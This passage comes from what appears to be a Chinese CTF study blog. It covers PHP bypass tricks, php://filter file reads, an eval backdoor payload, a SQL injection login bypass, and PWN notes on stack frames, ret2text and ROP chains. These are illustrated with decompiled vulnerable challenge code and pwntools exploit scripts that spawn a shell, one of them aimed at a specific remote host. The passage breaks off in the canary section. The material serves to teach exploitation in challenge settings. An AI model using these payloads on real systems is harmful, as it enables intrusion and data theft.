表明这是个字符串绕过比较.</li><li>array_search搜字符串绕过:字符串与数字比较会转成0,然后0==0直接绕过返回true,需要搜索的字符串不一定要存在了.</li><li>php get传参 <code>/?a=112&amp;b[]=abc&amp;c=&#123;&quot;m&quot;:a,&quot;n&quot;=[[],0]&#125;</code> 上面表示了几种不同方式的参数传递.</li><li>伪协议… <code>php://xxx</code> 和 <code>data://xxx</code> 等多刷几个题再更</li><li>file协议:能把源文件变成base64格式再展示,省的有些flag被当成代码被处理掉了… <code>/?file=php://filter/convert.base64-encode/resource=flag.php</code></li></ol><h3 id="php审计">php审计</h3><p>当你就剩一步的时候…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何构造?答:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="backup">backup</h2><p>常见备份文件后缀名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.bak</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.swp</span><br><span class="line">.bkf</span><br><span class="line">.bash_history</span><br><span class="line">.~</span><br></pre></td></tr></table></figure><h2 id="优先级">优先级</h2><p>windows或Linux下:</p><p><code>command1 &amp;&amp; command2</code> 先执行command1,如果为真,再执行command2<br><code>command1 || command2</code> 先执行command1,如果为假,再执行command2</p><p><code>command1 | command2</code> 只执行 command2<br><code>command1 &amp; command2</code> 先执行 command2 后执行 command1</p><h2 id="Linux大杂烩">Linux大杂烩</h2><p>学Web不可避免的温习Linux.</p><ol><li><code>ls /</code> 意思是 <code>ls ~/</code> .</li><li><code>/home</code> 是用户主工作目录.</li></ol><h2 id="Sql注入">Sql注入</h2><p>首先确认是使用什么闭合的,比如 <code>'</code> 或者 <code>&quot;</code> (方法:输入带 <code>'</code> 或 <code>&quot;</code> 的账号看报错).</p><p>然后使用<a href="https://zhuanlan.zhihu.com/p/485448815">万能密码</a>:<br><code>账户</code>: <code>a' or true #</code> 由于#会当成特殊字符,要使用url编码 <code>a' or true %23</code><br><code>密码</code>: <code>a' or true #</code> 由于#会当成特殊字符,要使用url编码 <code>a' or true %23</code></p><h1>PWN</h1><p><a href="https://https//www.cjovi.icu/">大佬博客</a></p><h2 id="PRE">PRE</h2><p>常见问题Q&amp;A(其实只是Flu自己比较好奇):</p><ol><li>这个CTF网站是拿什么做的?有没有模板?</li></ol><blockquote><p>A:有的.当前Spirit队用的好像是是ctfd,其他也有做的好的,比如ret2shell(平台会自动生成一个flag,并且挂载在/flag下)</p></blockquote><ol start="2"><li>可不可以做到每个人拿到的源文件的zip都不一样?</li></ol><blockquote><p>A:可以的,这个叫动态附件</p></blockquote><ol start="3"><li>那些需要容器的题是怎么回事?</li></ol><blockquote><p>A:Docker.</p></blockquote><ol start="4"><li>PWN题假如程序被干崩了会发生什么?</li></ol><blockquote><p>A:有socat,每次访问都会开一个新的程序.</p></blockquote><ol start="5"><li>那么,程序的基址是固定的情况下,为什么并发访问这多个程序不会出错?</li></ol><blockquote><p>A:虚拟地址喵…(寻址可以达到2^64就是因为上述理论均建立在虚拟内存的条件下)在这个时候程序的地址(虚拟地址)=基址+偏移,多个程序会直接换页表</p></blockquote><ol start="6"><li></li></ol><h2 id="查壳">查壳</h2><p>和Reverse一样,要先查壳…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=文件地址</span><br></pre></td></tr></table></figure><p>在windows下安装了pwntools之后自带checksec(能检查elf的),大可不必用虚拟机或wsl.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec xxxx</span><br></pre></td></tr></table></figure><h2 id="ret2text">ret2text</h2><h3 id="task1-3">task1</h3><p>我们小学二年级就知道，使用栈的结构来保存函数的嵌套调用关系是很方便的。</p><p>简单来说，栈就是一个可读写的数据段，程序可以通过push或pop指令压栈或弹栈，也即在栈上保存一个值或者弹出一个值到寄存器/内存单元。栈的增长方向是朝向低地址的，也就是说压栈的时候栈指针（如 x86-64 架构中的rsp）总是减小。</p><p>现在有一个过程f1，f1所有的非静态局部变量都可以放在栈上的一个指定区域内，简单地来说，这个区域被称作f1的栈帧。为了方便起见，我们需要用一个寄存器记录下当前栈帧最底部的地址（栈帧的基址），然后用一个固定的偏移去访问f1的非静态局部变量。</p><p>f1内嵌套调用f2时，我们将f1的栈帧基址与下一条指令的地址保存在f2栈帧的底部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">^ Low (Towards which</span><br><span class="line">|      stack grows)</span><br><span class="line">| </span><br><span class="line">|  +------------+</span><br><span class="line">|  |  f2_frame  |</span><br><span class="line">|  |   f1_bp    | &lt;- f2_bp</span><br><span class="line">|  | f1_retaddr |</span><br><span class="line">|  +------------+</span><br><span class="line">|  |  f1_frame  |</span><br><span class="line">|  |   ??_bp    | &lt;- f1_bp</span><br><span class="line">|  | ??_retaddr |</span><br><span class="line">|  +------------+</span><br><span class="line">| </span><br><span class="line">v High</span><br></pre></td></tr></table></figure><p>返回时，先从f2_bp处保存的f1_bp恢复f1的栈帧基址，再根据f1_retaddr的值返回到f1中调用f2时的下一条指令处。这样我们就从f2成功返回到了f1。</p><p>以我们熟知的 x86-64 架构为例，一般来说，通过call操作从f1进入f2时，处理器先将f1中下一条指令的地址压栈，进入到f2，然后f2在入口（prologue）处布置好自己的栈帧，</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">endbr64    ; 在处理器未开启CET时相当于空操作</span><br><span class="line">push rbp    ; 保存 f1 的栈帧</span><br><span class="line">mov rbp, rsp    ; 设置 f2 栈帧的基址</span><br><span class="line">sub rsp, xx    ; 在栈中“开辟”一段大小为 xx 的</span><br><span class="line">                 空间，用来管理非静态局部变量</span><br><span class="line">; …</span><br></pre></td></tr></table></figure><p>然后在出口（epilogue）处清理自己的栈帧并返回到f1，</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; …</span><br><span class="line">mov rsp, rbp    ; 经常与下面一条合并为 leave</span><br><span class="line">pop rbp    ; 返回到 f1 的栈帧</span><br><span class="line">ret xxx    ; 返回到 rsp 指向的地址，也即</span><br><span class="line">             f1 中 call 的下一条指令处，</span><br><span class="line">             被调用者清栈时会指定xxx的值</span><br></pre></td></tr></table></figure><p>如果没有需要用到栈的局部变量，那sub rsp, xx、leave都会省略。</p><p>在本题中有一个大小为100字节的buf变量，由于 x86-64 ABI 希望在执行call之前、布置栈帧之后的rsp是16字节对齐的，我们需要“开辟”一个112字节（100向上对齐到16的倍数）大小的栈空间用来存放buf，然后main函数便可以通过rbp-112来访问buf了。</p><p>众所周知，scanf(“%s”, buf);读到回车符（\n）才会停止读取输入，但并不会限制读入字符的数量，因此你可以从rbp-112一直连续写入到后面很远的地方。根据上文所述，你完全可以控制main返回时跳转到的地址。</p><p>backdoor过程中有一个system(“/bin/sh”);，意思是给你一个shell，这样你就可以通过shell命令控制操作系统干很多事情了，包括但不限于读写文件系统，而Flag正是保存在文件系统中的。</p><p>你可以采取如下的策略：</p><p>注：本题未开启canary与PIE，前者会阻止你简单地篡改旧栈帧基址与返回地址，而后者会随机化backdoor乃至整个程序的地址，你很难在不知道随机化后程序代码段基址的情况下控制程序跳转到相应的地址。<br>基址随机化是ASLR导致的</p><p>注：记得在调用system前保证rsp是16字节对齐的，system过程涉及一条指令movaps xmmword ptr [rsp], xmm1，此时的rsp若不是16字节对齐的便会触发段错误导致程序崩溃，这也是 x86-64 ABI 要求rsp对齐的原因之一（简化对齐的判定）。直接劫持返回地址到backdoor后的rsp一定不是对齐的（缺少call指令的一次压栈），你可以先跳到一个ret指令上让处理器多弹一次栈，然后再跳到backdoor（自己想想怎么布置栈上的内容），也可以直接跳转到backdoor开头的第一个push/pop指令后，因为64位下每次压栈/弹栈操作都会让rsp减少/增加8。</p><p>注意2:你要关注的是rbp的地址,体现在程序中是这里:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"><span class="comment">/*                            ^^^^^^^               */</span></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, system_);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也就是为什么你要构造0x40的payload.</p><h3 id="这个题的答案…">这个题的答案…</h3><p>首先构造112个字节填满缓存区.<br>然后随便构造8个字节填满bp(已经不需要回去了,bp也没用了)<br>然后找到基址:0x400000<br>backdoor地址:0x004011db(已经加上基址)<br>retn的地址:0x004011Da<br>答案:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + p64(ret_addr) + p64(backdoor_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="更广泛地…">更广泛地…</h3><p>据说这个题有两个做法,第一是覆盖满整个frame之后额外+8覆盖bp然后随便找一个ret取地址,然后加上后门地址,设frame大小为n,payload长这样:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*(n+<span class="number">8</span>)+p64(ret_addr)+p64(backdoor_addr)</span><br></pre></td></tr></table></figure><p>还有个更省事的办法,直接把后门函数正常进入的那个压栈函数略过,在+8盖住bp之后用后门函数地址覆盖ret地址,直接执行后面的内容,也可以做到:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*(n+<span class="number">8</span>)+p64(backdoor_addr)</span><br></pre></td></tr></table></figure><h3 id="task2-3">task2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">  _BYTE v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"><span class="comment">/*                        ^^^^^^                  */</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题中我们需要构造v1去覆盖v2,还是往rbp的方向去覆盖即可(44+payload).</p><h3 id="task3-2">task3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-50h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  _BYTE v6[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v8);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v7, <span class="string">&quot;you&quot;</span>, &amp;v8);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v10);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v9, <span class="string">&quot;I&quot;</span>, v10);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v6, (std::string *)&amp;input, (std::string *)v9);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v10, v2);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v8, v3);</span><br><span class="line">  src = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fgets要安全一点,因为他只要前32个输入,这会造成麻烦.别跑,后面这一长串还有东西的:<br>审计代码发现后面的字符串把I换成you,最后的地址还是s,所以可以栈溢出攻击. <code>pay=b'I'*(20)+b'A'*(4)+p64(tar)</code></p><h3 id="task4">task4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> n814536271, <span class="type">int</span> n425138641)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n255_2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> n255; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n255_1; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">if</span> ( n814536271 == <span class="number">814536271</span> &amp;&amp; n425138641 == <span class="number">425138641</span> )&#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    n255_2 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( n255_2 != <span class="number">255</span> )&#123;</span><br><span class="line">      n255 = (<span class="type">char</span>)n255_2;</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">putchar</span>(n255);</span><br><span class="line">        n255_1 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        n255 = (<span class="type">char</span>)n255_1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n255_1 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序要求正常跳到get_flag函数,但是其函数要求整个程序正常返回,同时还有两个额外参数要传.<br>这个时候应该是 <code>pay=fill+p32(get_flag)+p32(exit)+p32(参数1)+p32(参数2)</code><br>也就是说,参数传递在后面,依次传递.</p><h2 id="ROP链">ROP链</h2><p>栈溢出,传递参数,获取sh,一条龙.</p><h3 id="task1-4">task1</h3><p>我们在 <code>Pwn &gt; 1 - 胎息 &gt; ret2text</code> 中已经知道函数栈帧的结构，也知道如何通过篡改返回地址来劫持程序的执行流。<br>由于一些例程在刚被调用时会对一些通用寄存器进行压栈，最后在将要返回时逆序弹出这些寄存器的保存值，以使调用前后这些寄存器的值仍然保持一致，比如</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">push r15</span><br><span class="line">push rdi</span><br><span class="line">; ...</span><br><span class="line">pop rdi</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>因此这些例程的结尾存在形如pop - ret的指令序列。<br>假设某时刻程序将要执行ret以返回，栈顶保存的地址指向这样的一串指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">ret</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure><p>那么不难发现，执行完这两条指令后，我们的rdi寄存器的内容变成了rsp+8保存的八字节数据，然后程序通过ret跳转到rsp+16保存的地址。如Pwn &gt; 1 - 胎息 &gt; fmtstr中介绍的那样，默认的调用约定下，rdi保存的恰好是例程的第一个参数。我们从栈顶开始往下写入这样的数据： <code>p64(pop_rdi_ret) + p64(param_1) + p64(func)</code>其中pop_rdi_ret是指向pop rdi ; ret指令的地址，那么我们就可以劫持程序执行func(param_1);。这种攻击方法被广泛使用，称作面向返回的编程（Return-Oriented Programming，ROP），像上面那样往栈上写入的数据称为ROP链，而像pop rdi ; ret这样的指令序列被称作gadget（小片段）。<br>你可以通过ROPgadget查找一个ELF程序中可执行的gadget。如下命令用于查找./pwn中只含有pop与ret的可执行gadget。更多用法查看ROPgadget --help。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --only <span class="string">&quot;pop|ret&quot;</span> --binary ./pwn</span><br></pre></td></tr></table></figure><p>你可以通过GDB+Pwndbg来调试ELF程序。安装方法与使用方法从略。<br>你可以通过Pwntools内置的gdb.attach方法附加到一个由Pwntools的process启动的进程上并启动GDB调试会话。为了观察Payload将要生效时进程的详细状态，你需要在Payload被发送前就附加到这个进程上并暂停攻击脚本的执行，比如</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload =    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>现在看这个题的代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_FILENO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_FILENO 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gadget</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;pop rdi\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;ret\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> binsh[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;echo \&quot;Hi~ I&#x27;m Lillian Weinberg!\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&#x27;202.198.27.90&#x27;</span>,<span class="number">40163</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4011e3</span><span class="comment"># 指定命令 pop rdi ret</span></span><br><span class="line">binsh_addr = <span class="number">0x404040</span><span class="comment"># /bin/sh字符串的地址</span></span><br><span class="line">system_addr = <span class="number">0x401060</span><span class="comment"># sh后门的地址</span></span><br><span class="line">ret_addr = <span class="number">0x401201</span> <span class="comment"># 随便一个ret的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">256</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(ret_addr)<span class="comment"># 栈对齐</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Canary-金丝雀">Canary 金丝雀</h2><p>众所周知，当我们读入的字节数超过了缓冲区的大小时，多出来的部分会覆盖缓冲区尾巴后面的变量。为了缓解这个问题，人们引入了Canary的保护机制，以下引用CTF-Wiki的原文:</p><blockquote><p>Canary 